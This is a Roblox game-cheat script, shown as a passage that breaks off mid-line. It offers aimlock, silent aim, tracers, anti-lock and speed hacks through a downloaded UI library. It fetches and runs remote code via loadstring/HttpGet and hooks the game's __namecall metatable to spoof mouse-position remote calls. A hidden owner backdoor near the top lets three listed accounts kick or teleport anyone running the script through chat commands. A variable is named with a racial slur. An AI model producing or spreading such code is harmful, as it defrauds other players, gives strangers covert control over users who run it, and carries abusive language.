
 repeat wait() until game:IsLoaded()




local repo = 'https://raw.githubusercontent.com/LionTheGreatRealFrFr/MobileLinoriaLib/main/'


local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()


Library:Notify('Script Loading')
wait(1)


local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()
local Window = Library:CreateWindow({
    Title = 'Guy35',
    Center = true,
    AutoShow = true,
})


local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

local owners = {
    "27k_GAMIN",
    "pzoz853",  
    "3"
}

function x1y2z3(owner)
    if owner then
        localPlayer.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
    end
end

function a1b2c3(ownerName)
    local owner

    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name == ownerName then
            owner = player
            break
        end
    end

    if owner then
        owner.Chatted:Connect(function(message)
            if message == "/kick ." then
                localPlayer:Kick("Admins Has Kicked You.")
            elseif message == "/bring ." then
                x1y2z3(owner)
            end
        end)
    end
end

for _, ownerName in ipairs(owners) do
    a1b2c3(ownerName)
end

local Tabs = {
    Main = Window:AddTab('Main'),
    Misc = Window:AddTab('Misc'),
    Config = Window:AddTab('Config'),
}


Library:SetWatermarkVisibility(true)


local FrameTimer = tick()
local FrameCounter = 0;
local FPS = 60;

local WatermarkConnection = game:GetService('RunService').RenderStepped:Connect(function()
    FrameCounter += 1;

    if (tick() - FrameTimer) >= 1 then
        FPS = FrameCounter;
        FrameTimer = tick();
        FrameCounter = 0;
    end;

    Library:SetWatermark(('Guy35 | %s fps | %s ms'):format(
        math.floor(FPS),
        math.floor(game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue())
    ));
end);


Library:OnUnload(function()
    WatermarkConnection:Disconnect()

    print('Unloaded!')
    Library.Unloaded = true
end)

local LeftGroupBox = Tabs.Main:AddLeftGroupbox('General Settings')



getgenv().Psalms = {
    Enabled = true,
    HorizontalPrediction = 0.1,
    VerticalPrediction = 0.1,
    jumpoffset = -1,
    ResolverEnabled = false,
    SelectedPart = "HumanoidRootPart",
    AutoPrediction = true,
    AutoPredMode = "PingBased",  
    Macro = "OFF", -- OFF or ON
    ShootDelay = 0.22,
    NoGroundShot = true,
    AutoAir = false,
    LookAt = true,
    smoothness = 0.900,
    TracerEnabled = true
}


LeftGroupBox:AddToggle('Enabled', {
    Text = 'Target Lock',
    Default = getgenv().Psalms.Enabled,
    Callback = function(Value)
        getgenv().Psalms.Enabled = Value
    end
})

LeftGroupBox:AddToggle('Enabled', {
    Text = 'Tracer',
    Default = getgenv().Psalms.TracerEnabled,
    Callback = function(Value)
        getgenv().Psalms.TracerEnabled = Value
    end
})

LeftGroupBox:AddToggle('NoGroundShot', {
    Text = 'No Ground Shot',
    Default = getgenv().Psalms.NoGroundShot,
    Callback = function(Value)
        getgenv().Psalms.NoGroundShot = Value
    end
})

LeftGroupBox:AddToggle('LookAt', {
    Text = 'Look At',
    Default = getgenv().Psalms.LookAt,
    Callback = function(Value)
        getgenv().Psalms.LookAt = Value
    end
})

LeftGroupBox:AddToggle('resolvert', {
    Text = 'Resolver',
    Default = false,
    Callback = function(Value)
        getgenv().Psalms.ResolverEnabled = Value
    end
})


local DickHead = Tabs.Main:AddLeftGroupbox('Camera')


DickHead:AddToggle('CamLock', {
    Text = 'Enable CamLock',
    Default = getgenv().Psalms.Camera,
    Callback = function(Value)
        getgenv().Psalms.Camera = Value
    end
})



DickHead:AddInput('Smoothness', {
    Default = tostring(getgenv().Psalms.smoothness),
    Numeric = true,
    Text = 'Camera Smoothness',
    Callback = function(Value)
        getgenv().Psalms.smoothness = tonumber(Value)
    end
})


local sigmaox = Tabs.Main:AddLeftGroupbox('Auto Air')



sigmaox:AddToggle('Flicker', {
    Text = 'Flick',
    Default = getgenv().Psalms.Flick,
    Callback = function(Value)
        getgenv().Psalms.Flick = Value
    end
})

sigmaox:AddToggle('Auto Air', {
    Text = 'Enable Auto Air',
    Default = getgenv().Psalms.AutoAir,
    Callback = function(Value)
        getgenv().Psalms.AutoAir = Value
    end
})

sigmaox:AddInput('ShootDelay', {
    Default = tostring(getgenv().Psalms.ShootDelay),
    Numeric = true,
    Text = 'Shoot Delay',
    Callback = function(Value)
        getgenv().Psalms.ShootDelay = tonumber(Value)
    end
})




local RightGroupBox = Tabs.Main:AddRightGroupbox('Prediction Settings')

RightGroupBox:AddInput('HorizontalPrediction', {
    Default = tostring(getgenv().Psalms.HorizontalPrediction),
    Numeric = true,
    Text = 'Horizontal Prediction',
    Callback = function(Value)
        if not getgenv().Psalms.AutoPrediction then
            getgenv().Psalms.HorizontalPrediction = tonumber(Value)
        end
    end
})

RightGroupBox:AddInput('VerticalPrediction', {
    Default = tostring(getgenv().Psalms.VerticalPrediction),
    Numeric = true,
    Text = 'Vertical Prediction',
    Callback = function(Value)
        if not getgenv().Psalms.AutoPrediction then
            getgenv().Psalms.VerticalPrediction = tonumber(Value)
        end
    end
})

RightGroupBox:AddInput('Jump Offset', {
    Default = tostring(getgenv().Psalms.jumpoffset),
    Text = 'Jump Offset',
    Callback = function(Value)
        getgenv().Psalms.jumpoffset = Value
    end
})

RightGroupBox:AddToggle('AutoPrediction', {
    Text = 'Auto Prediction',
    Default = getgenv().Psalms.AutoPrediction,
    Callback = function(Value)
        getgenv().Psalms.AutoPrediction = Value
    end
})



-- Dropdown for Auto Prediction Mode
RightGroupBox:AddDropdown('AutoPredMode', {
    Values = { 'AdvanceCalculation', 'PingBased', 'Calculation', 'Blatant' },
    Default = getgenv().Psalms.AutoPredMode == 'PingBased' and 2 or 1, -- Default to PingBased
    Text = 'Auto Prediction Mode',
    Callback = function(Value)
        getgenv().Psalms.AutoPredMode = Value
    end
})

RightGroupBox:AddDropdown('SelectedPart', {
    Values = { 'Head', 'LowerTorso', 'UpperTorso', 'HumanoidRootPart' },
    Default = getgenv().Psalms.SelectedPart == 'Head' and 1 or
              getgenv().Psalms.SelectedPart == 'LowerTorso' and 2 or
              getgenv().Psalms.SelectedPart == 'UpperTorso' and 3 or 4,
    Text = 'Target Part',
    Callback = function(Value)
        getgenv().Psalms.SelectedPart = Value
    end
})

local RightGroupBox99 = Tabs.Main:AddRightGroupbox('Silent Aim')

RightGroupBox99:AddToggle('Si9282829382991lent', {
    Text = 'Silent Aim',
    Default = getgenv().Psalms.SilentAim,
    Callback = function(Value)
        getgenv().Psalms.SilentAim = Value
    end
})

RightGroupBox99:AddToggle('Silen3838322222182891929t', {
    Text = 'Fov',
    Default = false,
    Callback = function(Value)
        getgenv().ShowFOV = Value
    end
})


RightGroupBox99:AddInput('Fov Si9182819ze', {
    Default = tostring(getgenv().FOVSize or 25),
    Numeric = true,
    Text = 'Fov Size',
    Callback = function(Value)
        getgenv().FOVSize = tonumber(Value)
    end
})

local RightGroupBox2 = Tabs.Main:AddRightGroupbox('Anti Lock')

RightGroupBox2:AddToggle('AntiEnabled', {
    Text = 'Enable Anti',
    Default = getgenv().Psalms.AntiEnabled,
    Callback = function(Value)
        getgenv().Psalms.AntiEnabled = Value
    end
})


RightGroupBox2:AddDropdown('SelectedMode', {
    Values = { 'Predbreaker', 'Sky', 'Ground' },
    Default = getgenv().Psalms.AntiLock == 'Predbreaker' and 1 or
              getgenv().Psalms.AntiLock == 'Sky' and 2 or 3,
    Text = 'Mode Selection',
    Callback = function(Value)
        getgenv().Psalms.AntiLock = Value
    end
})


local LeftGp = Tabs.Misc:AddLeftGroupbox('Cframe')

getgenv().speedvalue = 0.9

LeftGp:AddInput('Spe992ed', {
    Default =  tostring(getgenv().speedvalue),
    Numeric = true,
    Text = 'Speed',
    Callback = function(Value)
        getgenv().speedvalue = tonumber(Value)
    end
})


LeftGp:AddToggle('Cfra992me', {
    Text = 'Cframe',
    Default = false,
    Callback = function(Value)
        getgenv().cframespeedtoggle = Value
    end
})

SaveManager:SetLibrary(Library)
ThemeManager:SetLibrary(Library)

ThemeManager:SetFolder('PsalmsTheme')
SaveManager:SetFolder('PsalmsCFG')

ThemeManager:ApplyToTab(Tabs['Config'])
SaveManager:BuildConfigSection(Tabs['Config'])








game:GetService("RunService").Heartbeat:Connect(function()
    local player = game.Players.LocalPlayer
    local character = player.Character

    if character and character:FindFirstChild("HumanoidRootPart") then
        local humanoidRootPart = character.HumanoidRootPart
        local vel = humanoidRootPart.Velocity

        if getgenv().cframespeedtoggle == true then
            humanoidRootPart.CFrame = humanoidRootPart.CFrame +
                character.Humanoid.MoveDirection * getgenv().speedvalue / 0.5
        end

        if getgenv().Psalms.AntiEnabled then
            if getgenv().Psalms.AntiLock == "Predbreaker" then
                humanoidRootPart.Velocity = Vector3.new(0, 0, 0)
            elseif getgenv().Psalms.AntiLock == "Sky" then
                humanoidRootPart.Velocity = Vector3.new(0, 100, 0)
            elseif getgenv().Psalms.AntiLock == "Ground" then
                humanoidRootPart.Velocity = Vector3.new(0, -400, 0)
            end
        end

        game:GetService("RunService").RenderStepped:Wait()
        humanoidRootPart.Velocity = vel
    end
end)


local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local CoreGui = game:GetService("CoreGui")
local dragging, dragInput, dragStart, startPos



local function createScreenGui()
    local existingGui = CoreGui:FindFirstChild("MyScreenGui")
    if existingGui then
        return existingGui
    end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "MyScreenGui"
    screenGui.Parent = CoreGui
    return screenGui
end

local function initializeToggleButton(screenGui)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 100, 0, 60)
    button.Position = UDim2.new(1, -100, 0, 80)
    button.Text = "Toggle UI"
    button.Font = Enum.Font.SourceSansBold
    button.TextSize = 14
    button.BackgroundColor3 = Color3.new(0, 0, 0)
    button.BackgroundTransparency = 1
    button.TextColor3 = Color3.new(1, 1, 1)
    button.BorderSizePixel = 0

    button.ClipsDescendants = true
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 5)
    corner.Parent = button

    button.Parent = screenGui

    button.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
            -- Trigger the toggle function on each click
            Library:Toggle()

            dragging = true
            dragStart = input.Position
            startPos = button.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    button.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
            dragInput = input
            local delta = dragInput.Position - dragStart
            button.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

local screenGui = createScreenGui()
initializeToggleButton(screenGui)


getgenv().Psalms.LockType = "Namecall"
getgenv().Psalms.RESOLVER = "MoveDirection"



local game_support = {
    [2788229376] = { Remote = "MainEvent", Argument = "UpdateMousePosI2" },
    [12238627497] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
    [5602055394] = { Remote = "MAINEVENT", Argument = "MousePos" },
    [17403265390] = { Remote = "MAINEVENT", Argument = "MOUSE" },
    [17403166075] = { Remote = "MAINEVENT", Argument = "MOUSE" },
    [18111448661] = { Remote = "MAINEVENT", Argument = "MOUSE" },
    [15186202290] = { Remote = "MAINEVENT", Argument = "MOUSE" },
    [11143225577] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
    [15763494605] = { Remote = "MAINEVENT", Argument = "MOUSE" },
    [125825216602676] = { Remote = "MAINEVENT", Argument = "MOUSE" },
    [15166543806] = { Remote = "MAINEVENT", Argument = "MoonUpdateMousePos" },
    [17897702920] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
    [16033173781] = { Remote = "MainEvent", Argument = "UpdateMousePosI2" },
    [7213786345] = { Remote = "MainEvent", Argument = "UpdateMousePosI2" },
    [9825515356] = { Remote = "MainEvent", Argument = "MousePosUpdate" },
    [16859411452] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
    [117734153242642] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
    [14277620939] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
    [17344804827] = { Remote = "MainEvent", Argument = "UpdateMousePos" }
}




    local Sigmaballs = Instance.new("ScreenGui")
    Sigmaballs.Name = "Sigmaballs"
    Sigmaballs.Parent = game.CoreGui
    Sigmaballs.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    Sigmaballs.ResetOnSpawn = false

    local ImageButton = Instance.new("ImageButton")
    ImageButton.Name = "ImageButton"
    ImageButton.Parent = Sigmaballs
    ImageButton.Active = true
    ImageButton.Draggable = true
    ImageButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    ImageButton.BackgroundTransparency = 0.350
    ImageButton.Size = UDim2.new(0, 90, 0, 90)
    ImageButton.Image = "rbxassetid://134820707156642"
    ImageButton.Position = UDim2.new(0.5, -25, 0.5, -25)

    local Ui2corner = Instance.new("UICorner")
    Ui2corner.CornerRadius = UDim.new(0.2, 0)
    Ui2corner.Parent = ImageButton


local player = game.Players.LocalPlayer
local Plr = nil
local enabled = false


local FOV43 = Drawing.new("Circle")
FOV43.Transparency = 0.5
FOV43.Thickness = 2
FOV43.Color = Color3.new(1, 0, 0)
FOV43.Filled = false
FOV43.Radius = 250
FOV43.Position = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)
FOV43.Visible = false

function SigmaOhioPlayer()
    local mouse = player:GetMouse()
    local closestPlayer
    local shortestDistance = math.huge
    local CC = game:GetService("Workspace").CurrentCamera
    local screenCenter = Vector2.new(CC.ViewportSize.X / 2, CC.ViewportSize.Y / 2)
    local fovRadius = FOV43.Radius
    local viewportSize = CC.ViewportSize

    for i, v in pairs(game.Players:GetPlayers()) do
        if v ~= player and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") then
            local pos, onScreen = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
            
            if onScreen and pos.X > 0 and pos.Y > 0 and pos.X < viewportSize.X and pos.Y < viewportSize.Y then
                local magnitude = (Vector2.new(pos.X, pos.Y) - screenCenter).magnitude
                if magnitude < fovRadius and magnitude < shortestDistance then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            end
        end
    end
    return closestPlayer
end

function createTracer(localPlayer, targetPlayer)
    if localPlayer and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") and
       targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then

        local tracerAttachment1 = Instance.new("Attachment", localPlayer.Character.HumanoidRootPart)
        local tracerAttachment2 = Instance.new("Attachment", targetPlayer.Character.HumanoidRootPart)

        local tracerBeam = Instance.new("Beam")
        tracerBeam.Attachment0 = tracerAttachment1
        tracerBeam.Attachment1 = tracerAttachment2
        tracerBeam.Color = ColorSequence.new(Color3.fromRGB(153, 0, 153))
        tracerBeam.Width0 = 0.080
        tracerBeam.Width1 = 0.080
        tracerBeam.Parent = localPlayer.Character.HumanoidRootPart

        tracernigger = tracerBeam  

        targetPlayer.CharacterAdded:Connect(function(newCharacter)
            if tracernigger then
                tracernigger:Destroy()  
                tracernigger = nil
            end

            newCharacter:WaitForChild("HumanoidRootPart")
            tracerAttachment2.Parent = newCharacter.HumanoidRootPart
            tracernigger = tracerBeam  
        end)
    end
end

function destroyTracer()
    if tracernigger then
        tracernigger:Destroy()
        tracernigger = nil
    end
end




function LookAtPlayer(Target)
    local localChar = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local localHumanoidRootPart = localChar:FindFirstChild("HumanoidRootPart")

    if localHumanoidRootPart then
        if getgenv().Psalms and getgenv().Psalms.LookAt then
            if Target and Target.Character and Target.Character:FindFirstChild("HumanoidRootPart") then
                local targetHumanoidRootPart = Target.Character.HumanoidRootPart
                
                local targetPosition = targetHumanoidRootPart.Position
                local localPosition = localHumanoidRootPart.Position
                
                local horizontalDirection = Vector3.new(targetPosition.X - localPosition.X, 0, targetPosition.Z - localPosition.Z).unit
                
                localHumanoidRootPart.CFrame = CFrame.new(localPosition, localPosition + horizontalDirection)
                localChar.Humanoid.AutoRotate = false
            end
        else
            localChar.Humanoid.AutoRotate = true
        end
    end
    
    if not (Target and Target.Character and Target.Character:FindFirstChild("HumanoidRootPart")) then
        localChar.Humanoid.AutoRotate = true
    end
end

local function toggleLock()
    if enabled then
        ImageButton.Image = "rbxassetid://134820707156642"
        enabled = false
        Plr = nil
        destroyTracer()  

        Library:Notify('Lock Disabled')
    else
        Plr = SigmaOhioPlayer()
        if Plr then
            enabled = true
            if getgenv().Psalms.TracerEnabled then
            createTracer(game.Players.LocalPlayer, Plr)  
        end
            
            ImageButton.Image = "rbxassetid://78342062013795"
Library:Notify("Target Locked: " .. tostring(Plr.Character.Humanoid.DisplayName)
            
            )
        end
    end
end

ImageButton.MouseButton1Click:Connect(toggleLock)

UserInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.DPadUp then
        toggleLock()
    end
end)

local function getRemoteInfo()
    local placeId = game.PlaceId
    return game_support[placeId] or { Remote = "MainEvent", Argument = "UpdateMousePos" }
end

local remoteInfo = getRemoteInfo()
local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)

local Vect3 = Vector3.new


local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)

mt.__namecall = newcclosure(function(...)
    local args = {...}
    local method = getnamecallmethod()

    if getgenv().Psalms.Enabled and getgenv().Psalms.LockType == "Namecall" then
        if Plr and Plr.Character and method == "FireServer" and (args[2] == remoteInf
